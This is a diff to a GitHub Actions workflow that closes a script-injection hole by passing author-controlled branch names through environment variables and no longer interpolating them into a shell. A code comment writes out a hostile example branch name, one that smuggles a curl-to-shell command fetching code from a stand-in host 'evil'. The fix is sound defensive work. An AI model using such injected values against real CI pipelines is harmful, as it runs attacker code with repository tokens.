@@ -5,7 +5,7 @@ on:
   pull_request:
     types: [labeled, synchronize, ready_for_review]
   workflow_run:
-    workflows: [CI, "Copilot: targeted CI"]
+    workflows: [CI]
     types: [completed]
 
 concurrency:
@@ -30,15 +30,24 @@ jobs:
         env:
           GH_TOKEN: ${{ github.token }}
           REPO: ${{ github.repository }}
+          # Branch names are author-controlled and reach a shell here, so they go
+          # through the environment rather than `${{ }}` interpolation — a branch
+          # called `a";curl evil|sh;"` would otherwise execute (actionlint
+          # `expression` rule / GitHub script-injection guidance). The PR number
+          # and head SHA below stay inline: both are numeric/hex, not injectable.
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          RUN_HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
         run: |
           set -euo pipefail
           if [[ "${{ github.event_name }}" == "pull_request" ]]; then
-            echo "pr_number=${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
-            echo "head_branch=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
-            echo "base_ref=${{ github.event.pull_request.base.ref }}" >> "$GITHUB_OUTPUT"
+            {
+              echo "pr_number=${{ github.event.pull_request.number }}"
+              echo "head_branch=$PR_HEAD_REF"
+              echo "base_ref=${{ github.event.pull_request.base.ref }}"
+            } >> "$GITHUB_OUTPUT"
             exit 0
           fi
-          BRANCH="${{ github.event.workflow_run.head_branch }}"
+          BRANCH="$RUN_HEAD_BRANCH"
           SHA="${{ github.event.workflow_run.head_sha }}"
           PR=$(gh pr list --repo "$REPO" --head "$BRANCH" --state open --json number,baseRefName --jq '.[0]')
           if [[ -z "$PR" || "$PR" == "null" ]]; then
@@ -50,9 +59,11 @@ jobs:
             echo "pr_number=" >> "$GITHUB_OUTPUT"
             exit 0
           fi
-          echo "pr_number=$(echo "$PR" | jq -r '.number')" >> "$GITHUB_OUTPUT"
-          echo "head_branch=$BRANCH" >> "$GITHUB_OUTPUT"
-          echo "base_ref=$(echo "$PR" | jq -r '.baseRefName')" >> "$GITHUB_OUTPUT"
+          {
+            echo "pr_number=$(echo "$PR" | jq -r '.number')"
+            echo "head_branch=$BRANCH"
+            echo "base_ref=$(echo "$PR" | jq -r '.baseRefName')"
+          } >> "$GITHUB_OUTPUT"
 
   gate:
     needs: resolve-pr
